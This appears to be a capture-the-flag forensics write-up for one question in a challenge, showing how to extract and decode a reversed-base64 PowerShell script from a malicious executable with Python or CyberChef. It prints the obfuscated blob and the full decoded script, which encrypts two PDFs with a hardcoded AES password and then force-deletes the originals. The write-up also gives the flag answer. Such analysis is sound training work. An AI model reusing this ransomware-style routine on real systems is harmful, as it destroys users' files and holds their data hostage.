# :game_die: Reverse it

---

Q5: By examining the malicious executable, we found that it uses an obfuscated script to decrypt specific files.
What predefined password does the script use for encryption?

At this stage we need to download the malicious file and try to run static malware analysis on the malicious file (be aware to use safe environment)

After downloading the malicious file, we need to run “[strings](https://download.sysinternals.com/files/Strings.zip)*” *on the file and redirect all strings inside a text file using something like this command:

```
.\strings.exe "D:\CYBERDEFENDERS\Silent_Breach\Downloads\IMF-Info.pdf.exe" > file.txt
```

open the output file on [Notepad++](https://notepad-plus-plus.org/downloads/)for a better view, and try to see anything catchy. Found Nothing at all TBH :(

Now i got an idea to see the static analysis for the malicious file on [Virustotal](https://www.virustotal.com/gui/home/upload), upload the file, and see the yara rules that matched

Any of the High Crowd sourced Sigma Rules can lead you, just see the “View matches” tab and see the full command line executed:

this .ps1 file seems very malicious, so let’s take a look at the strings output file we exported using “[strings](https://download.sysinternals.com/files/Strings.zip)*” *tool. search for the “Gz3m6mG3j2TyAqF2Zx4v.ps1” file in [Notepad++](https://notepad-plus-plus.org/downloads/)

which is make sense, as he said in the question it is a script so, “Gz3m6mG3j2TyAqF2Zx4v.ps1"is a powershell script, so we could've searched for any .ps1 script and we will get this powershell script also!!

Found only 1 search hit. And also found a malicious obfuscated code right below the “Gz3m6mG3j2TyAqF2Zx4v.ps1" file

So, using a simple python code to obfuscate that very loooong string starts with “K0QfK0QZjJ3bG1CIl”:

```
import base64
obfuscated = """K0QfK0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSBCIgAiCNoQDpgSZz9GbD5SbhVmc0NFd19GJgACIgoQDpgSZz9GbD5SbhVmc0N1b0BXeyNGJgACIgoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJgACIgoQDpgGdn5WZM5yclRXeC5WahxGckACLwACLzVGd5JkbpFGbwRCKlRXaydlLtFWZyR3UvRHc5J3YkACIgAiCNoQDpUGdpJ3V6oTXlR2bN1WYlJHdT9GdwlncD5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBCLy9Gdwlncj5WZkACLtFWZyR3U0V3bkgSbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3UvRHc5J3YkACIgAiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkACIgAiCNoQDpUGbpZEd1BnbpRCKzVGd5JEbsFEZhVmU6oTXlxWaG5yTJ5SblR3c5N1Wg0DIzVGd5JkbpFGbwRCIgACIK0gCNkCKy9Gdwlncj5WRlRXYlJ3QuMXZhRCI9AicvRHc5J3YuVGJgACIgoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJgACIgoQDDJ0Q6oTXlR2bNJXZoBXaD5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBSPgUGZv1kLzVWYkACIgAiCNYXakASPgYVSuMXZhRCIgACIK0QeltGJg0DI5V2SuMXZhRCIgACIK0QKoUGdhVmcDpjOdNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UbBSPgMXZhRCIgACIK0gCNcyYuVmLnACLnQiZkBnLcdCIlNWYsBXZy1CIlxWaGRXdw5WakASPgUGbpZEd1BHd19GJgACIgoQD7BSKzVGbpZEd1BnbpRCIulGIlxWaGRXdw5WakgCIoNWYlJ3bmpQDK0QKK0gImRGcu42bpN3cp1ULG1UScxFcvR3azVGRcxlbhhGdlxFXzJXZzVFXcpzQiACIgAiCNwiImRGcuQXZyNWZT1iRNlEXcB3b0t2clREXc5WYoRXZcx1cyV2cVxFX6MkIgACIgoQDoAEI9AyclxWaGRXdw5WakoQDzVGbpZGI0VHculGIm9GI0NXaMByIK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQyYlNVNyAjMj8mZuFiZtlkIg0DIkJ3b3N3chBHJ"""
# Reverse it
reversed_base64 = obfuscated[::-1]
# Decode from Base64
decoded = base64.b64decode(reversed_base64)
# Try to print the result as UTF-8
try:
print(decoded.decode('utf-8'))
except UnicodeDecodeError:
print("[!] Could not decode fully. Might be binary or further obfuscated.")
```

OR, using [cyberchef](https://gchq.github.io/CyberChef/), by reading the obfuscated code, we can see that it reverse the long string and decode it with base64 decoder

do the same filter on [cyberchef](https://gchq.github.io/CyberChef/)with the same order just like this, then add that very long string that starts with “K0QfK0QZjJ3bG1CIl”:

*Reverse the string then decode it From Base64*

```
# ====================================
# Decoded Powershell script
# ====================================

$password = "Imf!nfo#2025Sec$"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32
$ivSize = 16

$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

# List of input files
$inputFiles = @(
"C:\\Users\\ethan\\Desktop\\IMF-Secret.pdf",
"C:\\Users\\ethan\\Desktop\\IMF-Mission.pdf"
)

foreach ($inputFile in $inputFiles) {
$outputFile = $inputFile -replace '\.pdf$', '.enc'

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$encryptor = $aes.CreateEncryptor()

$plainBytes = [System.IO.File]::ReadAllBytes($inputFile)

$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

$cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
$cryptoStream.FlushFinalBlock()

$cryptoStream.Close()
$outStream.Close()

Remove-Item $inputFile -Force
}
```

>

*Answer5 → Imf!nfo#2025Sec$*

---
